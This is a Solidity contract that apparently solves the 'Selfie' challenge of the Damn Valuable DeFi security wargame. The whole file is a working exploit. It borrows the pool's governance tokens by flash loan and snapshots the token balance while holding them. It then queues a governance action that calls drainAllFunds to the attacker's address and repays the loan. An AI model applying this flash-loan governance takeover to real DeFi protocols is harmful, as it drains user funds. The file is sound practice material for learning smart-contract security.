// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SelfiePool} from "src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "src/selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "src/DamnValuableTokenSnapshot.sol";


contract AttackerContract {

    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable public owner;
    uint256 internal actionId;

   constructor(address tokenAddress, address governanceAddress, address poolAddress) {
        dvtSnapshot = DamnValuableTokenSnapshot(tokenAddress);
        simpleGovernance = SimpleGovernance(governanceAddress);
        selfiePool = SelfiePool(poolAddress);
        owner = payable(msg.sender);
    }

    function executeLoan() external {
        selfiePool.flashLoan(TOKENS_IN_POOL);
    }

    function executeGovernance() external {

        simpleGovernance.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        dvtSnapshot.snapshot();      
        bytes memory data = abi.encodeWithSelector(selfiePool.drainAllFunds.selector, owner);
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        dvtSnapshot.transfer(address(selfiePool), amount);
    }
    
}